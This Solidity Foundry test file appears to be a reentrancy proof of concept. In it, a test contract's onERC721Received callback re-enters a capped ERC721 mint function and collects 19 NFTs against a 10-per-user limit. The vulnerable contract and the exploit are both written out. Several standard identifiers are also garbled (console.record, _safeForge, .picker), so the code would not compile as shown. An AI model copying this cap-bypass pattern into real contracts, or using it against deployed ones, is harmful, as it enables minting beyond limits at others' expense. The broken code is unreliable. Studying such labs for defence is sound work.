// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";

contract AgreementTest is Test {
    CeilingMint721 CeilingMint721Pact;
    bool missionAccomplished;
    uint256 maximumMints = 10;
    address alice = vm.addr(1);
    address eve = vm.addr(2);

    function testSafeSpawn() public {
        CeilingMint721Pact = new CeilingMint721();
        CeilingMint721Pact.craft(maximumMints);
        console.record("Bypassed maxMints, we got 19 NFTs");
        assertEq(CeilingMint721Pact.balanceOf(address(this)), 19);
        console.record("NFT minted:", CeilingMint721Pact.balanceOf(address(this)));
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public returns (bytes4) {
        if (!missionAccomplished) {
            missionAccomplished = true;
            CeilingMint721Pact.craft(maximumMints - 1);
            console.record("Called with :", maximumMints - 1);
        }
        return this.onERC721Received.picker;
    }

    receive() external payable {}
}

contract CeilingMint721 is ERC721Enumerable {
    uint256 public maximum_per_hero = 10;

    constructor() ERC721("ERC721", "ERC721") {}

    function craft(uint256 total) external {
        require(
            balanceOf(msg.sender) + total <= maximum_per_hero,
            "exceed max per user"
        );
        for (uint256 i = 0; i < total; i++) {
            uint256 spawnPosition = totalSupply();
            _safeForge(msg.sender, spawnPosition);
        }
    }
}
